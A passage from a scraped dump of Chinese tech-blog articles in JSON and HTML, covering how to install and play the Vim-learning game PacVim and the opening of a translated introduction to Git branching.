中安装 Ncurses 库</a></li>\n<li><a href=\"https://www.ostechnix.com/install-development-tools-linux/\">如何在 Linux 中安装开发工具</a></li>\n</ul>\n<p>请注意，如果没有 gcc 4.8.X 或更高版本，这款游戏可能无法正确编译和安装。我在 Ubuntu 18.04 LTS 上测试了 PacVim，并且完美运行。</p>\n<p>安装 Ncurses 和 gcc 后，运行以下命令来安装 PacVim。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe105693265401653\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git clone https://github.com/jmoon018/PacVim.git\r\n$ cd PacVim\r\n$ sudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe105693265401653-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe105693265401653-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe105693265401653-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe105693265401653-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe105693265401653-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/jmoon018/PacVim.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe105693265401653-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-i\">PacVim</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe105693265401653-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe105693265401653-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">使用 PacVim 学习 Vim 命令</h3>\n<h4 id=\"toc_3\">启动 PacVim 游戏</h4>\n<p>要玩这个游戏，只需运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10569c658390153\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim [LEVEL_NUMER] [MODE]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10569c658390153-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10569c658390153-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10569c658390153-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LEVEL_NUMER</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">MODE</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10569c658390153-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>例如，以下命令以普通模式启动游戏第 5 关。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1056a0636900052\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5 n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1056a0636900052-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1056a0636900052-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1056a0636900052-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">n</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1056a0636900052-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这里，<code>5</code> 表示等级，<code>n</code>表示模式。有两种模式：</p>\n<ul>\n<li><code>n</code> – 普通模式。</li>\n<li><code>h</code> – 困难模式。</li>\n</ul>\n<p>默认模式是 <code>h</code>，这很难：</p>\n<p>要从头开始（<code>0</code> 级），请运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1056a4745053594\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1056a4745053594-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1056a4745053594-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1056a4745053594-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1056a4745053594-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>以下是我 Ubuntu 18.04 LTS 的示例输出。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/89a95a6695047749834d9662e67957f2.png\" alt=\"\"></p>\n<p>要开始游戏，只需按下回车。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/aeb1e44f7421aad3ecab3a2937083929.png\" alt=\"\"></p>\n<p>现在开始游戏。阅读下一节了解如何玩。</p>\n<p>要退出，请按下 <code>ESC</code> 或 <code>q</code>。</p>\n<p>以下命令以困难模式启动游戏第 <code>5</code> 关。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1056a7642228986\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5 h\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1056a7642228986-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1056a7642228986-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1056a7642228986-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">h</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1056a7642228986-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1056aa437499557\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1056aa437499557-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1056aa437499557-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1056aa437499557-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1056aa437499557-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h4 id=\"toc_4\">如何玩 PacVim？</h4>\n<p>PacVim 的使用与 PacMan 非常相似。</p>\n<p>你必须跑过屏幕上所有的字符，同时避免鬼魂（红色字符）。</p>\n<p>PacVim有两个特殊的障碍：</p>\n<ol>\n<li>你不能移动到墙壁中（黄色）。你必须使用 vim 动作来跳过它们。</li>\n<li>如果你踩到波浪字符（青色的 <code>~</code>），你就输了！</li>\n</ol>\n<p>你有三条生命。每次打赢 0、3、6、9 关时你都会获得新生命。总共有 10 关，从 0 到 9，打赢第 9 关后，游戏重置为第 0 关，但是鬼魂速度变快。</p>\n<p><strong>获胜条件</strong></p>\n<p>使用 vim 命令将光标移动到字母上并高亮显示它们。所有字母都高亮显示后，你就会获胜并进入下一关。</p>\n<p><strong>失败条件</strong></p>\n<p>如果你碰到鬼魂（用<strong>红色 G</strong> 表示）或者<strong>波浪字符</strong>，你就会失去一条命。如果命小于 0 条，你将会输掉整个游戏。</p>\n<p>这是实现的命令列表：</p>\n<table cellpadding=\"4\">\n<thead>\n<tr>\n<th>键</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>q</td>\n<td>退出游戏</td>\n</tr>\n<tr>\n<td>h</td>\n<td>向左移动</td>\n</tr>\n<tr>\n<td>j</td>\n<td>向下移动</td>\n</tr>\n<tr>\n<td>k</td>\n<td>向上移动</td>\n</tr>\n<tr>\n<td>l</td>\n<td>向右移动</td>\n</tr>\n<tr>\n<td>w</td>\n<td>向前移动到下一个 word 开始</td>\n</tr>\n<tr>\n<td>W</td>\n<td>向前移动到下一个 WORD 开始</td>\n</tr>\n<tr>\n<td>e</td>\n<td>向前移动到下一个 word 结束</td>\n</tr>\n<tr>\n<td>E</td>\n<td>向前移动到下一个 WORD 结束</td>\n</tr>\n<tr>\n<td>b</td>\n<td>向后移动到下一个 word 开始</td>\n</tr>\n<tr>\n<td>B</td>\n<td>向后移动到下一个 WORD 开始</td>\n</tr>\n<tr>\n<td>$</td>\n<td>移动到行的末尾</td>\n</tr>\n<tr>\n<td>0</td>\n<td>移动到行的开始</td>\n</tr>\n<tr>\n<td>gg/1G</td>\n<td>移动到第一行的开始</td>\n</tr>\n<tr>\n<td>数字加 G</td>\n<td>移动到由数字给出的行的开始</td>\n</tr>\n<tr>\n<td>G</td>\n<td>移到最后一行的开头</td>\n</tr>\n<tr>\n<td>^</td>\n<td>移到当前行的第一个 word</td>\n</tr>\n<tr>\n<td>＆</td>\n<td>1337 cheatz（打赢当前关）</td>\n</tr>\n</tbody>\n</table>\n<p>玩过几关之后，你可能会注意到 vim 的使用有改善。一段时间后继续玩这个游戏，直到你掌握 Vim 的使用。</p>\n<p><strong>建议阅读：</strong></p>\n<p>今天就是这些。希望这篇文章有用。PacVim 好玩又有趣并且让你有事做。同时，你应该能够彻底学习足够的 Vim 命令。试试看，你不会感到失望。</p>\n<p>还有更多的好东西。敬请关注！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114134\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114134votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114134\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/bdfaedb6c82e2ca844b66f19b78be2b5b4ef49f1.jpg"},{"url_object_id": "90144cba629e28c20a0e4a2ee1876768", "title": ["Git 分支操作介绍"], "url": "http://blog.jobbole.com/114107/", "create_date": "2018/06/10", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/b84f8d56e47a8496314a55a39b08ad10.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 3, "tags": "IT技术, Git, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/5/git-branching\">Kedar Vijay Kulkarni</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9724-1.html\">Linux中国/Andy Song</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/06/b84f8d56e47a8496314a55a39b08ad10.jpg\"></p>\n<p>在本系列的前两篇文章中，我们<a href=\"http://blog.jobbole.com/114101/\">开始使用 Git</a>，学会如何<a href=\"http://blog.jobbole.com/114104/\">克隆项目，修改、增加和删除内容</a>。在这第三篇文章中，我将介绍 Git 分支，为何以及如何使用分支。</p>\n<p><img class=\"aligncenter\" title=\"tree branches\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/33aa33f3f7c1b6dab4b586b93923469a.jpg\" alt=\"树枝\"></p>\n<p>不妨用树来描绘 Git 仓库。图中的树有很多分支，或长或短，或从树干延伸或从其它分支延伸。在这里，我们用树干比作仓库的 master 分支，其中 <code>master</code> 代指 ”master 分支”，是 Git 仓库的中心分支或第一个分支。为简单起见，我们假设 <code>master</code> 是树干，其它分支都是从该分支分出的。</p>\n<h3 id=\"toc_1\">为何在 Git 仓库中使用分支</h3>\n<p>使用分支的主要理由为：</p>\n<ul>\n<li>如果你希望为项目增加新特性，但很可能会影响当前可正常工作的代码。对于该项目的活跃用户而言，这是很糟糕的事情。与其将特性加入到其它人正在使用的 <code>master</code> 分支，更好的方法是在仓库的其它分支中变更代码，下面会给出具体的工作方式。</li>\n<li>更重要的是，<a href=\"https://en.wikipedia.org/wiki/Git\">Git 其设计</a>用于协作。如果所有人都在你代码仓库的 <code>master</code> 分支上操作，会引发很多混乱。对编程语言或项目的知识和阅历因人而异；有些人可能会编写有错误或缺陷的代码，也可能会编写你觉得不适合该项目的代码。使用分支可以让你核验他人的贡献并选择适合的加入到项目中。（这里假设你是代码库唯一的所有者，希望对增加到项目中的代码有完全的控制。在真实的项目中，代码库有多个具有合并代码权限的所有者）</li>\n</ul>\n<h3 id=\"toc_2\">创建分支</h3>\n<p>让我们回顾<a href=\"http://blog.jobbole.com/114104/\">本系列上一篇文章</a>，看一下在我们的 Demo 目录中分支是怎样的。如果你没有完成上述操作，请按照文章中的指示从 GitHub 克隆代码并进入 Demo 目录。运行如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a684255098646\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; 